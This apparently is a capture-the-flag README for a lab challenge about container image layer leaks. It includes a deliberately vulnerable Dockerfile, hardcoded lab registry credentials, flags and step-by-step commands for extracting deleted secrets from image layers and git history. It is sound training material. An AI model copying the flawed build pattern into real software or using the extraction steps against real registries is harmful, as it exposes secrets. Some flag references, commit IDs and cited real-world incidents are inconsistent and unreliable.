# Attack #2: Container Image Layer Leak

## Pre-requisites (For organizers)

```bash
make setup-challenge2
```

**Note**: Setting up Challenge 2 also seeds the `golang:1.25-alpine` base image to the local registry, which is required for Challenge 3 (Base Image Poisoning attack).

### Step 1: Deploy Challenge 2 Tekton Resources

```bash
make setup-challenge2-tekton
```

This will create:
- Push-triggered EventListener (`push-build-listener`)
- Pipeline to build and push container images (`push-build-pipeline`)
- Required tasks (git-clone, build-go-app, quality-check, build-container-image, push-container-image)
- RBAC resources and webhook secret

### Step 2: Configure Gitea Webhook

Set up a webhook on the `recipe-api` repository to trigger the pipeline on push events:

1. **Access Gitea**: Navigate to http://localhost:30002/ctf-admin/recipe-api/settings/hooks

2. **Add Webhook**: Click "Add Webhook" → "Gitea"

3. **Configure Webhook** with these settings:
   - **Target URL**: `http://el-push-build-listener.ctf-challenge.svc.cluster.local:8080`
   - **HTTP Method**: `POST`
   - **POST Content Type**: `application/json`
   - **Secret**: `change-me-in-production` (value from `github-webhook-secret`)
   - **Trigger On**: `Push events`
   - **Branch filter**: `main`

4. **Save** the webhook configuration

**Get the webhook secret value:**
```bash
kubectl get secret github-webhook-secret -n ctf-challenge -o jsonpath='{.data.secretToken}' | base64 -d
```

### Step 3: Trigger Initial Build to Populate Registry

Push a commit to the `recipe-api` main branch to trigger the pipeline and build the vulnerable image:

**Option A: Via Webhook (Recommended)**
```bash
# Clone or navigate to recipe-api
cd /tmp/gitea/recipe-api

# Make a change and push
git commit --allow-empty -m "Initial build for CTF"
git push origin main

# Monitor the pipeline
kubectl get pipelineruns -n ctf-challenge -w
```

**Option B: Manual Trigger**
```bash
# Trigger the pipeline manually
make trigger-challenge2-build

# Monitor progress
tkn pipelinerun logs -f -n ctf-challenge
```

**Option C: Build and Push Manually** (if pipeline fails)
```bash
cd challenges/victim-repo-sample

# Build the image with git history
podman build -t localhost:30000/recipe-api:v1.0 -f Dockerfile .

# Login to registry
podman login localhost:30000 --tls-verify=false \
  -u ctf-admin -p CTFRegistryPass123!

# Push the vulnerable image
podman push localhost:30000/recipe-api:v1.0 --tls-verify=false
```

### Step 4: Verify Setup

```bash
# Check that the image is in the registry
curl -k -u ctf-admin:CTFRegistryPass123! \
  https://localhost:30000/v2/recipe-api/tags/list

# Should return: {"name":"recipe-api","tags":["v1.0"]}

# Verify git history is leaked in the image
podman pull localhost:30000/recipe-api:v1.0 --tls-verify=false
podman save localhost:30000/recipe-api:v1.0 -o /tmp/test-image.tar
tar -tf /tmp/test-image.tar | grep -q "\.git" && echo "✓ Git history present in image layers"
```

The environment is now ready for participants to exploit!

## Overview

**Attack Type:** Container Supply Chain - Leaked Git History in Image Layers  
**Difficulty:** Medium  
**Prerequisites:** Completion of Attack #1 (Tekton Token Theft)  
**Learning Objectives:**
- Understanding Docker/Podman image layers
- Container forensics techniques
- Git history as an attack vector
- Secrets management in containerized environments

## Attack Scenario

After successfully exploiting the Tekton pipeline in Attack #1, the attacker has obtained registry credentials from the `ctf-flag` secret:

```bash
# From Attack #1 flag:
FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us:NEXT:registry_layer_leak}

# Registry credentials available in ctf-flag secret:
registry-url: https://localhost:30000
registry-user: ctf-admin
registry-password: CTFRegistryPass123!
next-target: recipe-api:v1.0
```

The organization has built and pushed a `recipe-api:v1.0` container image to this registry. A developer accidentally committed production secrets (including database credentials, API keys, registry access, and **ArgoCD deployment credentials**) to git, then removed them, but **didn't realize the git history remains in the container image layers**.

## Vulnerability Details

### The Flawed Dockerfile

```dockerfile
FROM golang:1.25-alpine AS builder
WORKDIR /app
COPY go.mod ./
RUN go mod download || true

# VULNERABILITY: Copy everything including .git
COPY . .

# SECURITY MISTAKE: Deleting .git only creates a new layer
# The .git content is still accessible in the previous layer!
RUN rm -rf .git

RUN CGO_ENABLED=0 GOOS=linux go build -o recipe-api main.go

FROM alpine:latest
RUN apk --no-cache add ca-certificates
WORKDIR /root/
COPY --from=builder /app/recipe-api .
EXPOSE 8080
CMD ["./recipe-api"]
```

### Why This is Vulnerable

Container images are built using a **layered filesystem**:

1. Each `RUN`, `COPY`, or `ADD` instruction creates a **new layer**
2. Layers are **immutable** - they can't be modified after creation
3. Deleting files in a later `RUN` command only adds a "whiteout" marker in that layer
4. The actual file content **remains in the previous layer**
5. Anyone with image access can extract and inspect each layer independently

**In this case:**
- Layer N: `COPY . .` → Includes the entire `.git` directory with full history
- Layer N+1: `RUN rm -rf .git` → Only marks `.git` as deleted in THIS layer
- Result: `.git` content is **still extractable** from Layer N

## Setup (For CTF Organizers)

The attack is already set up if you've completed the initial environment setup:

1. **Registry is running** on `https://localhost:30000`
2. **Image is built and pushed** to `localhost:30000/recipe-api:v1.0`
3. **Flag is updated** in Attack #1 to include registry credentials
4. **Git history** contains `.env.production` with secrets

### Verify Setup

```bash
# Check registry is running
kubectl get pods -n registry

# Verify image exists
curl -k -u ctf-admin:CTFRegistryPass123! \
  https://localhost:30000/v2/_catalog

# Should show: {"repositories":["recipe-api"]}
```

### Manual Setup (if needed)

```bash
# 1. Build the image (from this directory)
cd /home/skhoury/go/src/github.com/sherine-k/supply-chain-dd/challenges/victim-repo-sample

podman build -t localhost:30000/recipe-api:v1.0 -f Dockerfile .

# 2. Login to registry
podman login localhost:30000 --tls-verify=false \
  -u ctf-admin \
  -p CTFRegistryPass123!

# 3. Push the image
podman push localhost:30000/recipe-api:v1.0 --tls-verify=false
```

## For CTF Participants

### Starting Point

You've completed Attack #1 and obtained the flag:
```
FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us:NEXT:registry_layer_leak}
```

The flag hints at: `registry_layer_leak`

You also have access to the `ctf-flag` secret in the `ctf-challenge` namespace:

```bash
# Retrieve registry credentials
kubectl get secret ctf-flag -n ctf-challenge -o json | jq -r '.data | map_values(@base64d)'
```

### Your Mission

1. ✅ Use the registry credentials to access the container registry
2. ✅ Discover the `recipe-api:v1.0` image
3. ✅ Pull and analyze the image layers
4. ✅ Extract the `.git` directory from the vulnerable layer
5. ✅ Explore the git history to find deleted secrets
6. ✅ Retrieve the flag from `.env.production` in git history

### Detailed Exploitation Guide

See [ATTACK2-EXPLOITATION-GUIDE.md](./ATTACK2-EXPLOITATION-GUIDE.md) for:
- Complete step-by-step exploitation instructions
- Multiple methods to extract layer contents
- Tools and techniques for container forensics
- Prevention and detection measures

### Quick Win Path

```bash
# 1. Login to registry
podman login localhost:30000 --tls-verify=false \
  -u ctf-admin -p CTFRegistryPass123!

# 2. Pull the image
podman pull localhost:30000/recipe-api:v1.0 --tls-verify=false

# 3. Save as tar
podman save localhost:30000/recipe-api:v1.0 -o recipe-api.tar

# 4. Extract
mkdir extracted && tar -xf recipe-api.tar -C extracted/

# 5. Find and extract the layer with .git
cd extracted/
for layer in */; do
  tar -tf "$layer/layer.tar" 2>/dev/null | grep -q "^.git/" && echo "Found in: $layer"
done

# 6. Extract that layer
tar -xf <layer-id>/layer.tar

# 7. Explore git history
git log
git show <commit-hash>:.env.production
```

## The Flag

Hidden in the git history (commit `cb0d66f`) in the file `.env.production`:

```bash
# FLAG{l4y3r_l34k_g1t_h1st0ry:NEXT:g1t0ps_c0mpr0m1s3}
```

## Files in This Attack

```
challenges/victim-repo-sample/
├── Dockerfile                        # Vulnerable Dockerfile with layer leak
├── .git/                             # Git repository with secret history
│   ├── objects/                      # Contains deleted .env.production
│   └── logs/                         # Git reflog
├── main.go                           # Recipe API source code
├── internal/recipe/recipe.go         # Recipe business logic
├── go.mod                            # Go module definition
├── ATTACK2-README.md                 # This file
└── ATTACK2-EXPLOITATION-GUIDE.md     # Detailed exploitation walkthrough
```

## Real-World Examples

This vulnerability has affected real organizations:

1. **Uber (2017)** - Git repository accidentally committed with AWS keys in container image
2. **Docker Hub (2019)** - Thousands of images found with embedded secrets in layers
3. **Code42 (2021)** - Private keys exposed in deleted files within image layers
4. **Various npm packages** - `.git` directories in published npm packages leak source code

## Security Best Practices

### ✅ DO:
1. Use `.dockerignore` to exclude `.git`, `.env*`, and secrets
2. Use multi-stage builds and only copy necessary files
3. Never commit secrets to Git (use environment variables or secret managers)
4. Scan images with Trivy, Grype, or similar tools
5. Use distroless or minimal base images
6. Sign and verify images with Cosign/Notary

### ❌ DON'T:
1. Use `COPY . .` in production Dockerfiles
2. Commit secrets to Git, even temporarily
3. Try to delete files in later layers to "fix" exposure
4. Include development files (.git, .env, node_modules, etc.) in images
5. Trust that deleted files are actually removed

## Tools for Detection

**During Build:**
- `.dockerignore` - Prevent files from being copied
- `hadolint` - Lint Dockerfiles for best practices
- `dockle` - Container image linter for security

**After Build:**
- `trivy image` - Scan for vulnerabilities and secrets
- `grype` - Vulnerability scanner
- `dive` - Interactive layer explorer
- `container-diff` - Compare layers between images
- `ggshield` - Scan for secrets in containers

## Connection to Attack #3

The flag reveals: `webhook_c0nf1g_1nj3ct10n`

**Next Attack:** With registry access, the attacker can:
- Modify Gitea webhook configurations
- Inject malicious webhook URLs
- Intercept pipeline triggers
- Manipulate CI/CD execution

## Educational Value

Participants will learn:

1. **Container Internals**
   - Image layer architecture
   - Layer immutability
   - Filesystem overlay mechanisms

2. **Security Concepts**
   - Secrets management best practices
   - Supply chain attack vectors
   - Defense in depth

3. **Forensics Techniques**
   - Image layer extraction
   - Artifact analysis
   - Git history investigation

4. **Practical Skills**
   - Container tool usage (podman/docker)
   - Registry API interaction
   - Image scanning and analysis

## References

- [Docker Multi-Stage Builds](https://docs.docker.com/build/building/multi-stage/)
- [.dockerignore](https://docs.docker.com/engine/reference/builder/#dockerignore-file)
- [Trivy Scanner](https://github.com/aquasecurity/trivy)
- [Dive - Layer Explorer](https://github.com/wagoodman/dive)
- [Container Image Security](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Git Secrets](https://github.com/awslabs/git-secrets)

## Support

**Stuck?** Check the [ATTACK2-EXPLOITATION-GUIDE.md](./ATTACK2-EXPLOITATION-GUIDE.md) for detailed walkthroughs.

**Questions?** Review the git history structure:
- Commit 1 (`236e20b`): Initial commit with the Recipe API v1.0
- Commit 2 (`9d81c46`): Security fix - removed accidentally committed production secrets

The secrets are in Commit 1!
